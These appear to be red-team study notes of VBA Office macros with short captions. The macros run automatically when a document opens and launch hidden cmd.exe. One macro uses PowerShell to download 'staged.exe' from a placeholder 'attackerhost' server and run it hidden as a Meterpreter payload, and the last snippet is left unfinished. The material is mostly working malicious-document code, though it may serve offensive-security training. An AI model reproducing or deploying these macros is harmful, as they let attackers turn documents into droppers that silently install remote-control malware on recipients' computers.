##### Launch a command prompt in a hidden window 

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

##### Call to _CreateObject_ returns the WSH (Windows Scrip Host) object, from which we invoke the _Run_ method, supplying the path and name of the application to execute along with the _vbHide_ window style (0). Executing the Macro will once again open **cmd.exe** as a hidden process.

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

##### It will download the "staged.exe" executable from our web server, delay a few seconds to ensure the download completes, and then executes the Meterpreter payload (hidden).

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://attackerhost/staged.exe', 'staged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "staged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```


##### Print installed memory to MsgBox using imported Kernel32.dll library

```
Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "Kernel32.dll" (ByRef TotalMemoryInKilobytes As LongLong) As Long

Function MyMacro()
	Dim res As Long
	Dim InstalledMem As LongLong
	
	res = GetPhysicallyInstalledSystemMemory(InstalledMem)
	MsgBox (InstalledMem)
```
